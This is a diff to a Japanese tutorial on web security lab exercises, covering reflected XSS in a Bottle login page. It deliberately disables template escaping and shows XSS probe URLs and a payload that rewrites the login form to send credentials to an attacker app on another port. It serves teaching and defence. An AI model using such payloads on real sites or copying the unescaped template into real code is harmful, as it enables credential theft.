@@ -111,20 +111,45 @@ usersテーブルのid、email、hashed_password、nicknameが漏洩してしま
 
 絶対にプレースホルダーを使いましょう！
 
-# Reflected XSS
+## 反射型クロスサイトスクリプティング（Reflected XSS）
+
+```app.py```を次のように書き換えます。bottleのテンプレートで!（エクスクラメーションマーク）は、変数をエスケープせず生のまま表示することを意味します。
 
 ```diff:app.py
 -<p style="color:red;"> {{ message }} </p>
 +<p style="color:red;"> {{ !message }} </p>
 ```
 
+攻撃者は、ログイン画面でURLのquery parameterとして渡した文字列が画面に表示されていることに着目し、query parameterの扱いが雑になっていることを期待して、次のようなURLでアクセスしてきます。HTMLで```\<s\>```タグは取り消し線を意味します。
+
 ```
 http://localhost:8080/login?message=<s>hello</s>
 ```
 
+取り消されたhelloが表示され、エスケープ漏れがあることが分かりました。次に期待するのはスクリプトの混入です。
+
+```
+http://localhost:8080/login?message=<script>alert(1)</script>
+```
+
+```1```がアラートされ、スクリプトの混入に成功したことが分かります。攻撃者は自分のサイトを立ち上げ、ログイン画面に入力された情報を盗み出そうとします。まず、盗み出した情報を取得するWebアプリを起動します。別のコマンドプロンプトを立ち上げて、```evil.py```を実行してください。攻撃者のWebアプリは、localhost の 8081 ポートで起動します。
+
+```console
+> .\venv\Scripts\activate
+(venv)> py evil.py
+```
+
+攻撃者はログイン画面にスクリプトを混入することで、同じログイン画面にもかかわらず、データの向き先を変更できてしまいます。次のURLをクリックすると、向き先の変わったログイン画面が表示されます。
+
 ```
 http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://localhost:8081/users'}</script>
 ```
+
+もし正規のユーザーがこのURLを開いてしまうと、入力した情報が攻撃者に渡ってしまいます。
+
+### XSSを防ぐには
+
+エスケープ漏れをなくしましょう！
 
 # CSRF and Persistent XSS
 
